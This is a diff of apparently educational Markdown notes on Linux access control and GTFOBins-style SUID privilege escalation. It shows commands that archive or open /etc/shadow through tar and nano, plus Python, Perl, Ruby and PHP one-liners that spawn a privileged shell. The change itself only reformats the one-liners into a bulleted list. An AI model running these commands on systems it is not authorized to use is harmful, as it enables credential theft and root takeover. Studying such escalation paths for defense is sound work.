@@ -149,10 +149,10 @@ Even if DAC permissions allow access (e.g., root reading a file), MAC provides a
 | tar | tar -cf /tmp/shadow.tar /etc/shadow | "tar can archive any file it has access to. You archive the shadow file then extract it somewhere safe to read it."
 | nano | nano /etc/shadow | "Unlike vim nano usually doesn't have a ""shell escape"" but if it's SUID you can just open and edit system files directly."
 
-Python: `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
-Perl: `perl -e 'exec "/bin/sh";'`
-Ruby: `ruby -e 'exec "/bin/sh"'`
-PHP: `php -r "pcntl_exec('/bin/sh', ['-p']);"`
+* Python: `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
+* Perl: `perl -e 'exec "/bin/sh";'`
+* Ruby: `ruby -e 'exec "/bin/sh"'`
+* PHP: `php -r "pcntl_exec('/bin/sh', ['-p']);"`
 
 
 ### ❓ Q&A: Default Permissions of GTFOBins
